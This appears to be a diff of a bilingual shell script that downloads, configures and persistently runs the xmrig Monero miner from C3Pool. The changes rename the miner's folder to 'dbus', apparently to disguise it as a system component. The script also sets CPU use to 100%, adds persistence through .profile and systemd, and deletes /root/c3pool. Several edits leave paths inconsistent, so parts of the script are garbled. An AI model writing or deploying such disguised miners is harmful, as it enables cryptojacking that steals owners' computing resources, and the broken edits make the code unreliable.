@@ -125,8 +125,8 @@ fi
 
 echo "I will download, setup and run in background Monero CPU miner."
 echo "将进行下载设置,并在后台中运行xmrig矿工."
-echo "If needed, miner in foreground can be started by $HO/tmp/miner.sh script."
-echo "如果需要,可以通过以下方法启动前台矿工输出 $HO/tmp/miner.sh script."
+echo "If needed, miner in foreground can be started by $HO/dbus/miner.sh script."
+echo "如果需要,可以通过以下方法启动前台矿工输出 $HO/dbus/miner.sh script."
 echo "Mining will happen to $WALLET wallet."
 echo "将使用 $WALLET 地址进行开采"
 if [ ! -z $EMAIL ]; then
@@ -162,9 +162,9 @@ fi
 killall -9 xmrig
 
 echo "[*] Removing $HO/c3pool directory"
-rm -rf $HO/c3pool
+rm -rf /root/c3pool
 
-echo "[*] Downloading C3Pool advanced version of xmrig to /tmp/xmrig.tar.gz"
+echo "[*] Downloading C3Pool advanced version of xmrig to /dbus/xmrig.tar.gz"
 echo "[*] 下载 C3Pool 版本的 Xmrig 到 /tmp/xmrig.tar.gz 中"
 if ! curl -L --progress-bar "http://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
   echo "ERROR: Can't download http://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
@@ -174,25 +174,25 @@ fi
 
 echo "[*] Unpacking /tmp/xmrig.tar.gz to $HO/c3pool"
 echo "[*] 解压 /tmp/xmrig.tar.gz 到 $HO/c3pool"
-[ -d $HO/c3pool ] || mkdir $HO/c3pool
-if ! tar xf /tmp/xmrig.tar.gz -C $HO/c3pool; then
+[ -d $HO/dbus ] || mkdir $HO/dbus
+if ! tar xf /tmp/xmrig.tar.gz -C $HO/dbus; then
   echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HO/c3pool directory"
   echo "发生错误: 无法解压 /tmp/xmrig.tar.gz 到 $HO/c3pool 目录"
   exit 1
 fi
 rm /tmp/xmrig.tar.gz
 
-echo "[*] Checking if advanced version of $HO/tmp/xmrig works fine (and not removed by antivirus software)"
-echo "[*] 检查目录 $HO/tmp/xmrig 中的xmrig是否运行正常 (或者是否被杀毒软件误杀)"
-sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HO/tmp/config.json
-$HO/tmp/xmrig --help >/dev/null
+echo "[*] Checking if advanced version of $HO/dbus/xmrig works fine (and not removed by antivirus software)"
+echo "[*] 检查目录 $HO/dbus/xmrig 中的xmrig是否运行正常 (或者是否被杀毒软件误杀)"
+sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HO/dbus/config.json
+$HO/dbus/xmrig --help >/dev/null
 if (test $? -ne 0); then
-  if [ -f $HO/tmp/xmrig ]; then
-    echo "WARNING: Advanced version of $HO/tmp/xmrig is not functional"
-	echo "警告: 版本 $HO/tmp/xmrig 无法正常工作"
+  if [ -f $HO/dbus/xmrig ]; then
+    echo "WARNING: Advanced version of $HO/dbus/xmrig is not functional"
+	echo "警告: 版本 $HO/dbus/xmrig 无法正常工作"
   else 
-    echo "WARNING: Advanced version of $HO/tmp/xmrig was removed by antivirus (or some other problem)"
-	echo "警告: 该目录 $HO/tmp/xmrig 下的xmrig已被杀毒软件删除 (或其它问题)"
+    echo "WARNING: Advanced version of $HO/dbus/xmrig was removed by antivirus (or some other problem)"
+	echo "警告: 该目录 $HO/dbus/xmrig 下的xmrig已被杀毒软件删除 (或其它问题)"
   fi
 
   echo "[*] Looking for the latest version of Monero miner"
@@ -210,30 +210,30 @@ if (test $? -ne 0); then
 
   echo "[*] Unpacking /tmp/xmrig.tar.gz to $HO/c3pool"
   echo "[*] 解压 /tmp/xmrig.tar.gz 到 $HO/c3pool"
-  if ! tar xf /tmp/xmrig.tar.gz -C $HO/c3pool --strip=1; then
+  if ! tar xf /tmp/xmrig.tar.gz -C $HO/dbus --strip=1; then
     echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HO/c3pool directory"
 	echo "警告: 无法解压 /tmp/xmrig.tar.gz 到 $HO/c3pool 目录下"
   fi
   rm /tmp/xmrig.tar.gz
 
-  echo "[*] Checking if stock version of $HO/tmp/xmrig works fine (and not removed by antivirus software)"
-  echo "[*] 检查目录 $HO/tmp/xmrig 中的xmrig是否运行正常 (或者是否被杀毒软件误杀)"
-  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HO/tmp/config.json
-  $HO/tmp/xmrig --help >/dev/null
+  echo "[*] Checking if stock version of $HO/dbus/xmrig works fine (and not removed by antivirus software)"
+  echo "[*] 检查目录 $HO/dbus/xmrig 中的xmrig是否运行正常 (或者是否被杀毒软件误杀)"
+  sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HO/dbus/config.json
+  $HO/dbus/xmrig --help >/dev/null
   if (test $? -ne 0); then 
-    if [ -f $HO/tmp/xmrig ]; then
-      echo "ERROR: Stock version of $HO/tmp/xmrig is not functional too"
-	  echo "发生错误: 该目录中的 $HO/tmp/xmrig 也无法使用"
+    if [ -f $HO/dbus/xmrig ]; then
+      echo "ERROR: Stock version of $HO/dbus/xmrig is not functional too"
+	  echo "发生错误: 该目录中的 $HO/dbus/xmrig 也无法使用"
     else 
-      echo "ERROR: Stock version of $HO/tmp/xmrig was removed by antivirus too"
-	  echo "发生错误: 该目录中的 $HO/tmp/xmrig 已被杀毒软件删除"
+      echo "ERROR: Stock version of $HO/dbus/xmrig was removed by antivirus too"
+	  echo "发生错误: 该目录中的 $HO/dbus/xmrig 已被杀毒软件删除"
     fi
     exit 1
   fi
 fi
 
-echo "[*] Miner $HO/tmp/xmrig is OK"
-echo "[*] 矿工 $HO/tmp/xmrig 运行正常"
+echo "[*] Miner $HO/dbus/xmrig is OK"
+echo "[*] 矿工 $HO/dbus/xmrig 运行正常"
 
 PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 if [ "$PASS" == "localhost" ]; then
@@ -246,24 +246,24 @@ if [ ! -z $EMAIL ]; then
   PASS="$PASS:$EMAIL"
 fi
 
-sed -i 's/"url": *"[^"]*",/"url": "auto.c3pool.org:'$PORT'",/' $HO/tmp/config.json
-sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HO/tmp/config.json
-sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HO/tmp/config.json
-sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HO/tmp/config.json
-sed -i 's#"log-file": *null,#"log-file": "'$HO/tmp/xmrig.log'",#' $HO/tmp/config.json
-sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HO/tmp/config.json
+sed -i 's/"url": *"[^"]*",/"url": "auto.c3pool.org:'$PORT'",/' $HO/dbus/config.json
+sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HO/dbus/config.json
+sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HO/dbus/config.json
+sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HO/dbus/config.json
+sed -i 's#"log-file": *null,#"log-file": "'$HO/dbus/xmrig.log'",#' $HO/dbus/config.json
+sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HO/dbus/config.json
 
-cp $HO/tmp/config.json $HO/tmp/config_background.json
-sed -i 's/"background": *false,/"background": true,/' $HO/tmp/config_background.json
+cp $HO/dbus/config.json $HO/dbus/config_background.json
+sed -i 's/"background": *false,/"background": true,/' $HO/dbus/config_background.json
 
 # preparing script
 
-echo "[*] Creating $HO/tmp/miner.sh script"
-echo "[*] 在该目录下创建 $HO/tmp/miner.sh 脚本"
-cat >$HO/tmp/miner.sh <<EOL
+echo "[*] Creating $HO/dbus/miner.sh script"
+echo "[*] 在该目录下创建 $HO/dbus/miner.sh 脚本"
+cat >$HO/dbus/miner.sh <<EOL
 #!/bin/bash
 if ! pidof xmrig >/dev/null; then
-  nice $HO/tmp/xmrig \$*
+  nice $HO/dbus/xmrig \$*
 else
   echo "Monero miner is already running in the background. Refusing to run another one."
   echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
@@ -272,22 +272,22 @@ else
 fi
 EOL
 
-chmod +x $HO/tmp/miner.sh
+chmod +x $HO/dbus/miner.sh
 
 # preparing script background work and work under reboot
 
 if ! sudo -n true 2>/dev/null; then
-  if ! grep tmp/miner.sh $HO/.profile >/dev/null; then
-    echo "[*] Adding $HO/tmp/miner.sh script to $HO/.profile"
-	echo "[*] 添加 $HO/tmp/miner.sh 到 $HO/.profile"
-    echo "$HO/tmp/miner.sh --config=$HO/tmp/config_background.json >/dev/null 2>&1" >>$HO/.profile
+  if ! grep dbus/miner.sh $HO/.profile >/dev/null; then
+    echo "[*] Adding $HO/dbus/miner.sh script to $HO/.profile"
+	echo "[*] 添加 $HO/dbus/miner.sh 到 $HO/.profile"
+    echo "$HO/dbus/miner.sh --config=$HO/dbus/config_background.json >/dev/null 2>&1" >>$HOME/.profile
   else 
-    echo "Looks like $HO/tmp/miner.sh script is already in the $HO/.profile"
-	echo "脚本 $HO/tmp/miner.sh 已存在于 $HO/.profile 中."
+    echo "Looks like $HO/dbus/miner.sh script is already in the $HO/.profile"
+	echo "脚本 $HO/dbus/miner.sh 已存在于 $HO/.profile 中."
   fi
-  echo "[*] Running miner in the background (see logs in $HO/tmp/xmrig.log file)"
-  echo "[*] 已在后台运行xmrig矿工 (请查看 $HO/tmp/xmrig.log 日志文件)"
-  /bin/bash $HO/tmp/miner.sh --config=$HO/tmp/config_background.json >/dev/null 2>&1
+  echo "[*] Running miner in the background (see logs in $HO/dbus/xmrig.log file)"
+  echo "[*] 已在后台运行xmrig矿工 (请查看 $HO/dbus/xmrig.log 日志文件)"
+  /bin/bash $HO/dbus/miner.sh --config=$HO/dbus/config_background.json >/dev/null 2>&1
 else
 
   if [[ $(grep MemTotal /proc/meminfo | awk '{print $2}') -gt 3500000 ]]; then
@@ -299,9 +299,9 @@ else
 
   if ! type systemctl >/dev/null; then
 
-    echo "[*] Running miner in the background (see logs in $HO/tmp/xmrig.log file)"
-	echo "[*] 已在后台运行xmrig矿工 (请查看 $HO/tmp/xmrig.log 日志文件)"
-    /bin/bash $HO/tmp/miner.sh --config=$HO/tmp/config_background.json >/dev/null 2>&1
+    echo "[*] Running miner in the background (see logs in $HO/dbus/xmrig.log file)"
+	echo "[*] 已在后台运行xmrig矿工 (请查看 $HO/dbus/xmrig.log 日志文件)"
+    /bin/bash $HO/dbus/miner.sh --config=$HO/dbus/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
 
@@ -313,7 +313,7 @@ else
 Description=Monero miner service
 
 [Service]
-ExecStart=$HO/tmp/xmrig --config=$HO/tmp/config.json
+ExecStart=$HO/dbus/xmrig --config=$HO/dbus/config.json
 Restart=always
 Nice=10
 CPUWeight=1
@@ -347,8 +347,8 @@ if [ "$CPU_THREADS" -lt "4" ]; then
   fi
 else
   echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HO/tmp/config.json"
-  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HO/tmp/config_background.json"
+  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HO/dbus/config.json"
+  echo "sed -i 's/\"max-threads-hint\": *[^,]*,/\"max-threads-hint\": 75,/' \$HO/dbus/config_background.json"
 fi
 echo ""
 
